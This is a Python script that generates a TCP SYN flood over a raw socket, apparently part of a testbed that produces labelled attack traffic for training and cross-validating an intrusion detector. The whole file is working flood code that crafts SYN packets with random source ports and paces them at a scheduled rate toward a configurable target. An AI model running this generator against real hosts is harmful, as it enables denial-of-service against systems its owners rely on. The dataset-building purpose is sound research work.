#!/usr/bin/env python3
"""Raw-socket TCP SYN backend (v4 plan §5.4 / §6.3) — runs in the UE keepalive sidecar.

A SECOND SYN-flood generator besides hping3, so "leave-generator-out" CV is meaningful
(the sidecar has no scapy; this is pure stdlib + CAP_NET_RAW). Crafts IP+TCP SYN packets
with random source ports, follows the per-second schedule (SYN count), and emits the
same achieved-row schema as the other backends. Fixed 40 B IP length (no options) ->
`native_unit` is packets/s; its benign counterpart is tcp_shortconn (completed handshakes).

Plan: pacer-shaped; per-second target is a SYN count (from "pps" else bytes / 60).
"""
import json, random, socket, struct, sys, time

SYN_WIRE = 40                                     # IPv4(20) + TCP(20), no options


def _checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


def _syn(src, dst, sport, dport, seq):
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, (5 << 4), 0x02, 65535, 0, 0)
    pseudo = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, socket.IPPROTO_TCP, len(tcp))
    csum = _checksum(pseudo + tcp)
    return tcp[:16] + struct.pack("!H", csum) + tcp[18:]


def main():
    raw = open(sys.argv[1]).read() if len(sys.argv) > 1 and sys.argv[1] != "-" else sys.stdin.read()
    p = json.loads(raw)
    rng = random.Random(p.get("seed", 0))
    dst = p["dst"]
    src = p.get("bind") or "0.0.0.0"
    dport = (p.get("ports") or [80])[0]
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 0)      # kernel builds the IP header
    if p.get("bind"):
        s.bind((p["bind"], 0))

    start = time.clock_gettime(time.CLOCK_REALTIME)
    mono0 = time.monotonic()
    for i, sec in enumerate(p["seconds"]):
        n = int(sec["pps"]) if sec.get("pps") else int(round(float(sec.get("bytes") or 0.0) / 60.0))
        t_start = mono0 + i
        sent = 0
        for k in range(n):
            due = t_start + (k + 0.5) / n if n else t_start
            now = time.monotonic()
            if due > now:
                time.sleep(due - now)
            elif now - t_start >= 1.0:
                break
            try:
                s.sendto(_syn(src, dst, rng.randint(1024, 65535), dport, rng.getrandbits(32)), (dst, dport))
                sent += 1
            except OSError:
                pass
        rem = (mono0 + i + 1) - time.monotonic()
        if rem > 0:
            time.sleep(rem)
        row = {"t": round(start + i, 3), "sec": i, "backend": "synflood",
               "target_bytes": round(float(sec.get("bytes") or n * SYN_WIRE), 1), "target_pkts": n,
               "sent_bytes": sent * SYN_WIRE, "sent_pkts": sent,
               "achieved_mbps": round(sent * SYN_WIRE * 8 / 1e6, 4), "achieved_pps": sent}
        gate = p.get("attack_active")
        if gate is not None and i < len(gate):
            row["attack_active"] = int(gate[i])
        print(json.dumps(row), flush=True)
    s.close()


if __name__ == "__main__":
    main()
